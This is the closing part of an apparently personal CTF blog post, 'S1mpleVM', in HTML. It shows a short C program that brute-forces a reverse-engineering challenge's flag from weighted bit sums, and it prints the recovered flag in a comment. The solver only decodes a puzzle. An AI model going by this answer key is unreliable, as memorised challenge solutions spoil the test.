class="line">2,3,67,37,41,11,13,89,2,3,67,5,7,47,61,29,2,67,37,7,43,11,13,31,97,3,41,73,11,13,53,29,97,67,3,11,43,13,47,83,67,5,37,71,7,11,89,29,2,3,5,11,13,83,53,61,2,3,7,71,43,83,29,31,7,73,11,13,53,89,29,31,2,3,5,37,7,43,13,61,2,5,7,43,11,13,53,89,5,7,73,43,11,13,59,31,3,5,73,41,43,13,83,89,2,7,71,11,43,13,29,61,2,5,7,11,13,79,47,83,3,67,37,5,73,11,13,61,2,67,5,7,71,11,13,61,67,3,5,37,43,11,13,61,2,3,37,7,71,41,11,29,3,5,41,11,43,47,53,29,2,3,7,71,43,13,47,79,2,3,5,37,11,43,13,79,97,67,5,37,7,41,11,61,3,71,7,43,11,79,53,61,2,3,71,73,11,13,61,31,97,2,3,67,5,11,13,83,2,3,5,37,7,41,11,53,2,3,73,43,11,13,53,61,2,67,3,37,7,11,47,59,2,37,5,73,13,47,53,59,2,67,71,73,41,11,13,89,2,3,67,37,73,11,43,59,&#125;;</span><br><span class="line">char target[]=&#123;70,56,70,77,74,90,87,82,60,67,86,95,64,94,85,66,33,69,64,98,67,71,94,93,90,32,65,82,68,65,93,96,&#125;;</span><br><span class="line">int checkval(int i,int pos)&#123;</span><br><span class="line">	int sum=0;</span><br><span class="line">	for(int j=0;j&lt;8;j++)&#123;</span><br><span class="line">		sum+=((i&gt;&gt;j)&amp;1)*v[j+pos*8];</span><br><span class="line">	&#125;</span><br><span class="line">	return sum;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	for(size_t i=0;i&lt;sizeof(target);i++)&#123;</span><br><span class="line">		for(int j=0x20;j&lt;127;j++)&#123;</span><br><span class="line">			if(target[i]==checkval(j,i))&#123;</span><br><span class="line">				putchar(j);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">//s1mpl3_VM_us3s_link3d_l1st_st4ck</span><br></pre></td></tr></table></figure>

<p><img src="/image-20251107213047428.png" alt="image-20251107213047428"></p>
<p>输入得到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/11/17/S1mpleVM/" data-id="cuidrYGxsG84V-ZbXrAA45G9N" data-title="S1mpleVM" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
          </li>
        
          <li>
            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
          </li>
        
          <li>
            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
          </li>
        
          <li>
            <a href="/2025/10/17/train0927/">train0927</a>
          </li>
        
          <li>
            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>